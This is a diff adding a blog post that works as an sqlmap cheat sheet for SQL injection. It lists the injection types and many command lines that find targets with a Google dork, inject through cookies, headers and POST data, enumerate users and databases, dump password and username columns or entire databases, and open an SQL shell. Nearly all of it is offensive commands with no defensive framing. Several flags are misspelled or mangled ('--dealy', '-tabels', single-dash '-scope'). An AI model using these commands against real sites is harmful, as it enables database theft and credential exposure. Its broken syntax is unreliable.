@@ -1,0 +1,65 @@
+<blockquote>
+  <p>First write this article is several months ago, now post it on my blog</p>
+</blockquote>
+
+<h2 id="sqlmap">sqlmap</h2>
+<ol>
+  <li><code class="highlighter-rouge">sqlmap -d </code> is used to connect from your nachine to the database server’s TCP port where the database management system is listening on.</li>
+</ol>
+
+<h2 id="five-different-sql-injection-types">five different SQL injection types:</h2>
+<blockquote>
+  <p>Bollean-based blind
+Time-based blind
+Error-based blind
+Union query-based
+Stacked queries</p>
+</blockquote>
+
+<h2 id="several">several</h2>
+<ol>
+  <li>sqlmap.py -u “url”</li>
+  <li>sqlmap.py -l burp.log</li>
+  <li>sqlmap.py -m 1.txt this is some url write in a text and sqlmap will test</li>
+  <li>sqlmap.py -r post_data.txt the txt file is data of post</li>
+  <li>sqlmap.py -g “inurl:asp?id” this is google dork</li>
+  <li>sqlmap.py -d “mysql//username:password@123.12.23.23:33306/databasename”</li>
+</ol>
+
+<h2 id="several-kind-of-requests">several kind of requests</h2>
+<ol>
+  <li>GET sqlmap.py -u “url”</li>
+  <li>POST sqlmap.py -r 1.txt</li>
+  <li>POST FOR FORM sqlmap -u “url” –forms</li>
+  <li>POST sqlmap.py -u “url” –data “age=24”</li>
+  <li>COOKIE sqlmap.py -u “url” –cookie “data” –level 2 NOTE:cookie only work when it is level2</li>
+  <li>User-Agent sqlmap -u “url” –user-agent=”chrome 55 firefox 50” -v 3</li>
+  <li>Referer sqlmap.py -u “url” –referer “http://tieba.baidu.com” -v 3</li>
+  <li>Dealy sqlmap.py -u “url” –dealy 10</li>
+  <li>Timeout sqlmap.py -u “url” –timeout 10   NOTE:10seconds show timeout, default is 30s</li>
+  <li>Retry sqlmap.py -u “url” —retries 10</li>
+  <li>Use regex <code class="highlighter-rouge">sqlmap.py -l burp.log -scope="(www)?\.target\.\(com|net|org|cn)"</code></li>
+  <li>Avoid too much wrong requests sqlmap.py -u “url” –safe-url “url” get safe url in some time</li>
+  <li>Avoid too much wrong requests sqlmap.py -u “url” –safe-freq “url” get safe url every test</li>
+  <li>Pamera sqlmap.py -u “http://xxxx.com/id*/45” or sqlmap.py -u “url” -p “id”</li>
+  <li>Version of database sqlmap.py -u “url” -b</li>
+  <li>sqlmap.py -u “url” –banner</li>
+  <li>sqlmap.py -u “url” –current-db</li>
+  <li>sqlmap.py -u “url” –current-user</li>
+  <li>sqlmap.py -u “url” –users</li>
+  <li>sqlmap.py -u “url” –dbs</li>
+  <li>sqlmap.py -u “url” -tabels -D “databasename”</li>
+  <li>sqlmap.py -u “url” –columns -T “tablesname” -D “databasename”</li>
+  <li>sqlmap.py -u “url” –tables -D “databasename” –count</li>
+  <li>sqlmap.py -u “url” –dump -C “passwd, username” -T “tablename” -D “databasename”</li>
+  <li>sqlmap.py -u “url” –start 1 –stop 3 -T “tablename” -D “databasename”</li>
+  <li>sqlmap.py -u “url” –first 1 –last 5</li>
+  <li>Get all the database sqlmap.py -u “url” –dump-all</li>
+  <li>Get all the database sqlmap.py -u “url” –dump-all –exclude-sysdbs Note:only get user database, bot system dbs</li>
+  <li>sqlmap.py -u “url” –sql-shell</li>
+  <li>sqlmap.py -u “url” –sql-query “select * from admin”</li>
+  <li>sqlmap.py -u “url” –search -D test NOTE:to search database name or -T -C</li>
+  <li>sqlmap.py -u “url” –schema NOTE:to show the constract of database</li>
+  <li>sqlmap.py -u “url” –exclude-sysdbs avoid system dbs</li>
+</ol>
+
